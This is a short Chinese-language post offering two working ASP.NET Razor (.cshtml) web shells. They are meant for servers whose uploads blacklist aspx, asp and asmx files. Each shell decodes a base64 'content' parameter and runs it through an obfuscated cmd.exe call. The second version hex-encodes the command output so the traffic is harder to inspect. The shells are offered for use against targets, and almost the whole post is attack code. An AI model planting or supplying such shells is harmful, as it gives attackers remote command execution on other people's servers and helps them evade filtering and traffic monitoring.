有时候目标黑名单了aspx、asp、asmx，我们就可以用cshtml脚本去玩了<br />虽然输入是加密了输入，但是输出流是明文的。
```
@{
    if (System.Web.HttpContext.Current.Request["content"] != null)
    {
        String content = System.Text.Encoding.GetEncoding("utf-8").GetString(Convert.FromBase64String(System.Web.HttpContext.Current.Request["content"]));
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.FileName = "c@m@d.e@x@e".Replace("@", "");
        p.StartInfo.Arguments = "/c " + content;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.Start();
        byte[] data = System.Text.Encoding.Default.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
        System.Web.HttpContext.Current.Response.Write("<pre>" + System.Text.Encoding.Default.GetString(data) + "</pre>");
    }
    else
    {
        System.Web.HttpContext.Current.Response.Write("<p style='color:#ff0000;text-align:center;'>example: dotnet.cshtml?content=ipconfig(base64)</p>");
    }
}

```

稍微魔改一下，用ASCII HEX加密输出<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1664334257109-5cc5d3a3-cc43-4d44-ade4-677d095915ab.png#clientId=u142f999a-7926-4&from=paste&height=298&id=u7f55e731&originHeight=373&originWidth=1853&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56534&status=done&style=none&taskId=uacffa226-ea6e-48b7-82b2-ac2ee75b48b&title=&width=1482.4)

魔改后成这样子http://x.x.x.x/test.cshtml?content=base64传入，内容流量是用ASCII HEX加密输出
```
@{
    if (System.Web.HttpContext.Current.Request["content"] != null)
    {
        String content = System.Text.Encoding.GetEncoding("utf-8").GetString(Convert.FromBase64String(System.Web.HttpContext.Current.Request["content"]));
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.FileName = "c@m@d.e@x@e".Replace("@", "");
        p.StartInfo.Arguments = "/c " + content;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.Start();
        byte[] data = System.Text.Encoding.Default.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
        System.Web.HttpContext.Current.Response.Write("<pre>" + Convert.ToHexString(data) + "</pre>");
    }
    else
    {
        System.Web.HttpContext.Current.Response.Write("<p style='color:#ff0000;text-align:center;'>example: dotnet.cshtml?content=ipconfig(base64)</p>");
    }
}

```
